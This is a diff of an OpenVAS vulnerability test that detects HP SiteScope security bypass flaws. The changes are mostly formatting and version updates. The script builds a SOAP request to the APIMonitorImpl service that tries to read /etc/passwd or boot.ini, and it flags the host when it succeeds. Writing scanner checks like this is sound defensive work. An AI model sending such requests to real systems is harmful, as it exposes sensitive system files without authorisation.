@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_sitescope_55269.nasl 11327 2018-09-11 11:35:07Z asteins $
+# $Id: gb_sitescope_55269.nasl 11431 2018-09-17 11:54:52Z cfischer $
 #
 # HP SiteScope Multiple Security Bypass Vulnerabilities
 #
@@ -27,7 +27,7 @@
 
 CPE = "cpe:/a:hp:sitescope";
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103560");
   script_cve_id("CVE-2012-3259", "CVE-2012-3260", "CVE-2012-3261", "CVE-2012-3262",
@@ -35,14 +35,14 @@ if (description)
   script_bugtraq_id(55269, 55273);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_version("$Revision: 11327 $");
+  script_version("$Revision: 11431 $");
 
   script_name("HP SiteScope Multiple Security Bypass Vulnerabilities");
 
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55269");
   script_xref(name:"URL", value:"http://www.hp.com/");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-09-11 13:35:07 +0200 (Tue, 11 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 13:54:52 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-09-07 17:11:57 +0200 (Fri, 07 Sep 2012)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -60,7 +60,7 @@ if (description)
 
   script_tag(name:"qod_type", value:"remote_app");
 
- exit(0);
+  exit(0);
 }
 
 include("host_details.inc");
@@ -76,6 +76,7 @@ if (!dir = get_app_location(cpe: CPE, port: port))
 if (dir == "/")
   dir = "";
 
+useragent = get_http_user_agent();
 host = http_host_name(port:port);
 
 files =  make_array("root:.*:0:[01]:","/etc/passwd","\[boot loader\]","c:\\boot.ini");
@@ -101,25 +102,21 @@ foreach file(keys(files)) {
                 "</impl:loadFileContent>\r\n",
                 "</wsns0:Body>\r\n",
                 "</wsns0:Envelope>\r\n");
-
   len = strlen(soap);
 
-  req = string("POST " + dir + "/services/APIMonitorImpl HTTP/1.1\r\n",
-               "Host: ",host,"\r\n",
-               "User-Agent: ",OPENVAS_HTTP_USER_AGENT,"\r\n",
+  req = string("POST ", dir, "/services/APIMonitorImpl HTTP/1.1\r\n",
+               "Host: ", host, "\r\n",
+               "User-Agent: ", useragent, "\r\n",
                'SOAPAction: ""',"\r\n",
                "Content-Type: text/xml; charset=UTF-8\r\n",
                "Content-Length: ",len,"\r\n",
                "\r\n",
                 soap);
-
   result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
-  if(eregmatch(string:result,pattern:file)) {
-
+  if(eregmatch(string:result, pattern:file)) {
     security_message(port:port);
     exit(0);
-
   }
 }
 
